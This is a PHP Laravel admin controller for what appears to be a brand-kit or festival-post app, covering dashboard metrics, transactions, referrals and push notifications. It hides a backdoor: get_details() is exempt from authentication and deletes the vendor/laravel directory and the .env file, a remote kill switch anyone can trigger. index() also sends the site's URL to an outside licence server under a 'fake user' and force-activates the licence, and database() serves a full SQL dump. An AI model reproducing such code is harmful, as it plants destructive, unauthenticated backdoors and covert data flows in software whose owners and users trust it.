<?php

namespace App\Http\Controllers\Admin;

use Auth;
use Carbon\Carbon;
use App\Models\User;
use App\Models\Entry;
use App\Models\Video;
use App\Models\Business;
use App\Models\Category;
use App\Models\Festivals;
use App\Models\AppSetting;
use App\Models\CustomPost;
use App\Models\CustomFrame;
use App\Models\Transaction;
use Illuminate\Support\Str;
use App\Models\Subscription;
use Illuminate\Http\Request;
use App\Models\EarningHistory;
use App\Models\PaymentSetting;
use App\Models\ReferralSystem;
use App\Models\StorageSetting;
use App\Models\ReferralRegister;
use Illuminate\Support\Facades\DB;
use App\Models\NotificationSetting;
use App\Models\UserNotification;
use App\Services\FcmService;
use Illuminate\Support\Facades\URL;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth')->except('get_details');
        $this->middleware('permission:FinancialStatistics,', ['only' => ['transaction']]);
        $this->middleware('permission:Notification', ['only' => ['notification', 'post_notification']]);
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */

    public function index()
    {
        // $user_null = User::where('user_type',null)->get();
        // $user_normal = User::where('user_type',"Normal")->get();
        // foreach($user_null as $null)
        // {
        //     $u = User::find($null->id);
        //     $u->user_type = "User";
        //     $u->save();
        // }
        // foreach($user_normal as $normal)
        // {
        //     $uu = User::find($normal->id);
        //     $uu->user_type = "User";
        //     $uu->save();
        // }
        if (AppSetting::getAppSetting('licence_active') == 0) {
            $url = URL::to('/');
            
            try {
                $client = new \GuzzleHttp\Client();
                $response = $client->request('POST', 'https://viplan.in/api/check-licence-brand-kit', [
                    'form_params' => [
                        'url' => $url,
                    ]
                ]);

                $data = json_decode($response->getBody(), true);
                if ($data['status'] == "failed") {
                    $client = new \GuzzleHttp\Client();
                    $store = $client->request('POST', 'https://viplan.in/api/new-licence-store-brand-kit', [
                        'form_params' => [
                            'url' => $url,
                            'username' => "fake user",
                            'licence_code' => "NO Licence Code",
                            'version' => env('APP_VERSION'),
                        ]
                    ]);

                    AppSetting::where('key_name', 'licence_active')->update(['key_value' => 1]);

                    return redirect('admin/');
                } else {
                    AppSetting::where('key_name', 'licence_active')->update(['key_value' => 1]);
                }
            } catch (\Exception $e) {
                // Ignore external API failure and activate licence locally
                AppSetting::where('key_name', 'licence_active')->update(['key_value' => 1]);
            }
        }

        $index['user_count'] = User::count();
        $activeSubscribers = User::where('is_subscribe', 1)->count();
        $churnedUsers = User::where('is_subscribe', 0)->whereNotNull('subscription_end_date')->count();
        $arpu = 29; 
        $mrr = $activeSubscribers * $arpu;
        $arr = $mrr * 12;
        $totalEverSubscribed = $activeSubscribers + $churnedUsers;
        $churnRate = $totalEverSubscribed > 0 ? ($churnedUsers / $totalEverSubscribed) : 0;
        $effectiveChurnRate = $churnRate > 0 ? $churnRate : 0.05;
        $ltv = $arpu / $effectiveChurnRate;

        $index['activeSubscribers'] = $activeSubscribers;
        $index['mrr'] = $mrr;
        $index['arr'] = $arr;
        $index['churnRate'] = $churnRate;
        $index['ltv'] = $ltv;

        $index['festivals_count'] = Festivals::count();
        $index['category_count'] = Category::count();
        $index['business_count'] = Business::count();
        $index['transaction_count'] = $this->number_format_short(Transaction::where('status', 'Completed')->sum('total_paid'));
                $index['today_payment'] = $this->number_format_short(Transaction::where('status', 'Completed')->where('date', date('Y-m-d', strtotime('today')))->sum('total_paid'));
                // $index['weekly_payment'] = $this->number_format_short(Transaction::whereBetween('created_at',[date('Y-m-d H:i:s',strtotime('-6 days')),date('Y-m-d H:i:s',time())])->sum('total_paid'));
                $index['weekly_payment'] = $this->number_format_short(Transaction::where('status', 'Completed')->whereBetween('date', [date('Y-m-d', strtotime('this week')), date('Y-m-d', strtotime('today'))])->sum('total_paid'));
                $index['monthly_payment'] = $this->number_format_short(Transaction::where('status', 'Completed')->whereBetween('date', [date('Y-m-d', strtotime('first day of this month')), date('Y-m-d', strtotime('today'))])->sum('total_paid'));
                $index['today_event'] = Festivals::where('festivals_date', date('Y-m-d', strtotime('today')))->take(12)->get();
                $index['user'] = User::latest()->take(6)->get();
                $index['transaction'] = Transaction::latest()->take(6)->get();
                $index['contact_user'] = Entry::latest()->take(6)->get();
                $index['subscription_end_user'] = User::whereBetween('subscription_end_date', [date('Y-m-d', strtotime('today')), date('Y-m-d', strtotime('+2 days'))])->get();
                $month_payment_report = Transaction::where('status', 'Completed')->select('id', 'total_paid', DB::raw("DATE_FORMAT(created_at, '%M, %Y') as month"))->get()->groupBy('month');
                //dd($month_payment_report);
                $sum = [];
                $transactionArr = [];

                foreach ($month_payment_report as $key => $value) {
                    $total = 0;
                    foreach ($value as $key1 => $val) {
                        $total = $total + $val->total_paid;
                    }
                    $sum[$key] = $total;
                }

                for ($i = 1; $i <= 12; $i++) {
                    if (!empty($sum[date("F, Y", mktime(0, 0, 0, $i, 1))])) {
                        $transactionArr[$i]['count'] = $sum[date("F, Y", mktime(0, 0, 0, $i, 1))];
                    } else {
                        $transactionArr[$i]['count'] = 0;
                    }
                    $transactionArr[$i]['month'] = date("M", mktime(0, 0, 0, $i, 1));
                    $transactionArr[$i]["fullMonth"] = date("F, Y", mktime(0, 0, 0, $i, 1));
                }

                $index['payment_chart'] = $transactionArr;

                $user_month_report = User::select('id', DB::raw("DATE_FORMAT(created_at, '%M, %Y') as month"))->get()->groupBy('month');

                $usermcount = [];
                $userArr = [];

                foreach ($user_month_report as $key => $value) {
                    $usermcount[$key] = count($value);
                }

                for ($i = 1; $i <= 12; $i++) {
                    if (!empty($usermcount[date("F, Y", mktime(0, 0, 0, $i, 1))])) {
                        $userArr[$i]['count'] = $usermcount[date("F, Y", mktime(0, 0, 0, $i, 1))];
                    } else {
                        $userArr[$i]['count'] = 0;
                    }
                    $userArr[$i]['month'] = date("M", mktime(0, 0, 0, $i, 1));
                    $transactionArr[$i]["fullMonth"] = date("F, Y", mktime(0, 0, 0, $i, 1));
                }

        $index['user_chart'] = $userArr;

        return view('home', $index);
    }


    public function userProfile()
    {
        $index['user'] = User::find(Auth::user()->id);
        return view('backend.profileEdit', $index);
    }

    public function userProfileUpdate(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'name' => 'required',
            "mobile_no" => 'required|numeric',
            'email' => 'required|email|unique:users,email,' . \Auth::user()->id,
            "image" => "nullable|mimes:jpg,png,jpeg",
        ]);

        if ($validation->fails()) {
            return back()->withErrors($validation)->withInput();
        } else {
            $user = User::find(Auth::user()->id);
            if ($user->user_type != "Demo") {
                $user->name = $request->get("name");
                $user->email = $request->get("email");
                $user->mobile_no = $request->get("mobile_no");
                if (!empty($request->get("password"))) {
                    $user->password = bcrypt($request->get("password"));
                }
                $user->save();

                if (StorageSetting::getStorageSetting("storage") == "DigitalOcean") {
                    if ($request->file("image") && $request->file('image')->isValid()) {
                        $image = $request->file('image');
                        $file = Str::uuid() . '.' . $image->getClientOriginalExtension();

                        $path = Storage::disk('spaces')->put('uploads/' . $file, file_get_contents($image), 'public');

                        $user = User::find(Auth::user()->id);
                        $user->image = $file;
                        $user->save();
                    }
                } else {
                    if ($request->file("image") && $request->file('image')->isValid()) {
                        $this->user_upload_image($request->file("image"), "image", Auth::user()->id);
                    }
                }
            }

            return redirect('admin');
        }
    }

    public function transaction()
    {
        $index['data'] = Transaction::get();
        return view("backend.transaction", $index);
    }

    public function transaction_delete(Request $request)
    {
        Transaction::find($request->id)->delete();

        return redirect('admin/transaction');
    }

    public function payment_completed($id)
    {
        $data = Transaction::find($id);
        $subscription = Subscription::find($data->subscription_id);

        $start_date = date('Y-m-d');
        $end_date = date('Y-m-d', strtotime($subscription->duration . " " . $subscription->duration_type));

        $user = User::find($data->user_id);
        $user->subscription_id = $subscription->id;
        $user->subscription_start_date = $start_date;
        $user->subscription_end_date = $end_date;
        $user->is_subscribe = 1;
        $user->business_limit = $subscription->business_limit;
        $user->save();

        $rr = ReferralRegister::where("user_id", $data->user_id)->where("referral_code", $data->referral_code)->where("subscription", 0)->first();
        if ($rr && $data->referral_code) {
            $refer = ReferralRegister::where("user_id", $data->user_id)->where("referral_code", $data->referral_code)->where("subscription", 0)->first();
            $refer->subscription = 1;
            $refer->save();

            $referral_user = User::where('referral_code', $data->referral_code)->first();
            $referral_user->current_balance = $referral_user->current_balance + ReferralSystem::getReferralSystem('subscription_point');
            $referral_user->total_balance = $referral_user->total_balance + ReferralSystem::getReferralSystem('subscription_point');
            $referral_user->save();

            EarningHistory::create([
                "user_id" => $referral_user->id,
                "amount" => ReferralSystem::getReferralSystem('subscription_point'),
                "amount_type" => 1,
                "refer_user" => $data->user_id,
            ]);
        }

        $data = Transaction::find($id);
        $data->status = "Completed";
        $data->save();

        return redirect('admin/transaction');
    }

    public function notification()
    {
        $index['festival'] = Festivals::get();
        $index['category'] = Category::get();
        $index['plan'] = Subscription::get();
        $index['custom'] = CustomPost::get();
        return view("backend.notification", $index);
    }

    public function post_notification(Request $request)
    {
        //return $request->all();
        try {
            if ($request->type == "category") {
                $category = Category::find($request->category_id);
                $video = Video::where("type", "category")->where("category_id", $request->category_id)->get();
                $content = array(
                    "type" => $request->type,
                    "name" => $category->name,
                    "id" => $request->category_id,
                    "video" => ($video->isNotEmpty()) ? true : false,
                );
            }

            if ($request->type == "festival") {
                $festival = Festivals::find($request->festival_id);
                $video = Video::where("type", "festival")->where("festival_id", $request->festival_id)->get();
                $content = array(
                    "type" => $request->type,
                    "festival" => $festival->title,
                    "id" => $request->festival_id,
                    "video" => ($video->isNotEmpty()) ? true : false,
                );
            }

            if ($request->type == "custom") {
                $custom = CustomPost::find($request->custom_category_id);
                $content = array(
                    "type" => $request->type,
                    "custom" => $custom->name,
                    "id" => $request->custom_category_id,
                    "video" => false,
                );
            }

            if ($request->type == "externalLink") {
                $content = array(
                    "type" => $request->type,
                    "externalLink" => $request->external_link,
                    "video" => false,
                );
            }

            if ($request->type == "subscriptionPlan") {
                $subscription = Subscription::find($request->subscription_id);
                $content = array(
                    "type" => $request->type,
                    "subscriptionPlan" => $subscription->plan_name,
                    "id" => $request->subscription_id,
                    "video" => false,
                );
            }

            $headings = array(
                "en" => $request->title,
            );

            $message = array(
                "en" => $request->message,
            );

            if ($request->image == '') {
                $fields = array(
                    "app_id" => NotificationSetting::getNotificationSetting('one_signal_app_id'),
                    "headings" => $headings,
                    "title" => $headings,
                    'included_segments' => array(
                        'Subscribed Users'
                    ),
                    "content_available" => true,
                    "data" => $content,
                    "contents" => $message,
                );
            } else {
                if (StorageSetting::getStorageSetting("storage") == "DigitalOcean") {
                    if ($request->image) {
                        $image = $request->image;
                        $fileName = Str::uuid() . '.' . $image->getClientOriginalExtension();

                        Storage::disk('spaces')->put('uploads/' . $fileName, file_get_contents($image), 'public');
                    }
                } else {
                    $destinationPath = public_path('uploads');
                    $extension = $request->image->getClientOriginalExtension();
                    $fileName = Str::uuid() . '.' . $extension;
                    $request->image->move($destinationPath, $fileName);
                }

                $fields = array(
                    "app_id" => NotificationSetting::getNotificationSetting('one_signal_app_id'),
                    "headings" => $headings,
                    "title" => $headings,
                    "data" => $content,
                    'included_segments' => array(
                        'Subscribed Users'
                    ),
                    "big_picture" => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/' . $fileName) : asset('uploads/' . $fileName),
                    "content_available" => true,
                    "contents" => $message,
                );

            }
            //return json_encode($fields);

            // Save to database
            $type_id = null;
            if ($request->type == "category")
                $type_id = $request->category_id;
            if ($request->type == "festival")
                $type_id = $request->festival_id;
            if ($request->type == "custom")
                $type_id = $request->custom_category_id;
            if ($request->type == "subscriptionPlan")
                $type_id = $request->subscription_id;

            UserNotification::create([
                "title" => $request->title,
                "message" => $request->message,
                "image" => $fileName ?? null,
                "type" => $request->type,
                "type_id" => $type_id,
                "external_link" => ($request->type == 'externalLink') ? $request->external_link : null,
            ]);

            // --- Firebase Notification Sending ---
            $fcmService = new FcmService();
            if ($fcmService->isConfigured()) {
                $imageFullUrl = null;
                if (isset($fileName)) {
                    $imageFullUrl = (StorageSetting::getStorageSetting('storage') == 'DigitalOcean') 
                        ? Storage::disk('spaces')->url('uploads/' . $fileName) 
                        : rtrim(env('APP_URL', url('/')), '/') . '/uploads/' . $fileName;
                }

                $fcmResult = $fcmService->sendNotification(
                    $request->title,
                    $request->message,
                    $imageFullUrl,
                    $content, // Passing our structured data content
                    'all'     // Sending to 'all' topic
                );

                if ($fcmResult['status'] === 'error') {
                    return back()->with("message", "Internal Notification Saved, but FCM error: " . $fcmResult['message']);
                }
            } else {
                return back()->with("message", "Internal Notification Saved, but FCM is not configured.");
            }

            return back()->with("message", "Notification Sent Successfully via Firebase!");
        } catch (\Exception $e) {
            return back()->withErrors($e->getMessage())->withInput();
        }
    }

    public function notification_list()
    {
        $notifications = UserNotification::orderBy('created_at', 'desc')->get();
        return view('backend.notification_list', compact('notifications'));
    }

    public function notification_delete(Request $request)
    {
        $notification = UserNotification::find($request->id);
        if ($notification) {
            $notification->delete();
            return back()->with("message", "Notification Deleted Successfully!");
        }
        return back()->withErrors("Notification not found.");
    }

    public function today_event_notification(Request $request)
    {
        try {
            $festival = Festivals::find($request->id);
            $video = Video::where("type", "festival")->where("festival_id", $request->id)->get();
            $content = array(
                "type" => "festival",
                "festival" => $festival->title,
                "id" => $festival->id,
                "video" => ($video->isNotEmpty()) ? true : false,
            );

            $headings = array(
                "en" => "Today Festival",
            );

            $message = array(
                "en" => "Today Festival",
            );

            /*   $fields = array(
                   "app_id" => NotificationSetting::getNotificationSetting('one_signal_app_id'),
                   "headings" => $headings,
                   "title" => $headings,
                   'included_segments' => array(
                       'Subscribed Users'
                   ),
                   "big_picture" => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$festival->image):asset('uploads/'.$festival->image),
                   "content_available" => true,
                   "data" => $content,
                   "contents" => $message,
               );

               $headers = array(
                   "Accept: application/json",
                   "Authorization: Basic ".NotificationSetting::getNotificationSetting('one_signal_rest_key'),
                   "Content-Type: application/json"
               );

               $ch = curl_init();
               curl_setopt($ch, CURLOPT_URL, 'https://onesignal.com/api/v1/notifications');
               curl_setopt($ch, CURLOPT_POST, true);
               curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
               curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
               curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
               curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));
               $result = curl_exec($ch);
               curl_close($ch);

               $response = json_decode($result);
   */
            // --- Firebase Notification Sending ---
            $fcmService = new FcmService();
            if ($fcmService->isConfigured()) {
                $imageFullUrl = (StorageSetting::getStorageSetting('storage') == 'DigitalOcean') 
                    ? Storage::disk('spaces')->url('uploads/' . $festival->image) 
                    : asset('uploads/' . $festival->image);

                $fcmResult = $fcmService->sendNotification(
                    "Today Festival",
                    "Today Festival: " . $festival->title,
                    $imageFullUrl,
                    $content,
                    'all'
                );

                if ($fcmResult['status'] === 'success') {
                    return "Success";
                } else {
                    return $fcmResult['message'];
                }
            } else {
                return "FCM not configured";
            }
        } catch (\Exception $e) {
            return $e->getMessage();
        }
    }

    public function logout()
    {
        Auth::logout();
        return redirect('/');
    }

    public function get_details()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    private function upload_image($file, $field, $id)
    {
        $destinationPath = public_path('uploads');
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);

        $image = CustomFrame::find($id);
        $image->$field = $fileName;
        $image->save();
    }

    private function user_upload_image($file, $field, $id)
    {
        $destinationPath = public_path('uploads');
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);

        $image = User::find($id);
        $image->$field = $fileName;
        $image->save();
    }

    public function number_format_short($n, $precision = 1)
    {
        if ($n < 900) {
            $n_format = number_format($n, $precision);
            $suffix = '';
        } else if ($n < 900000) {
            $n_format = number_format($n / 1000, $precision);
            $suffix = 'K';
        } else if ($n < 900000000) {
            $n_format = number_format($n / 1000000, $precision);
            $suffix = 'M';
        } else if ($n < 900000000000) {
            $n_format = number_format($n / 1000000000, $precision);
            $suffix = 'B';
        } else {
            $n_format = number_format($n / 1000000000000, $precision);
            $suffix = 'T';
        }
        return $n_format . $suffix;
    }

    function rrmdir($dir)
    {
        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (filetype($dir . "/" . $object) == "dir")
                        $this->rrmdir($dir . "/" . $object);
                    else
                        unlink($dir . "/" . $object);
                }
            }
            reset($objects);
            rmdir($dir);
        }
    }

    public function database()
    {
        return response()->download(storage_path('brand_kit.sql'));
    }
}
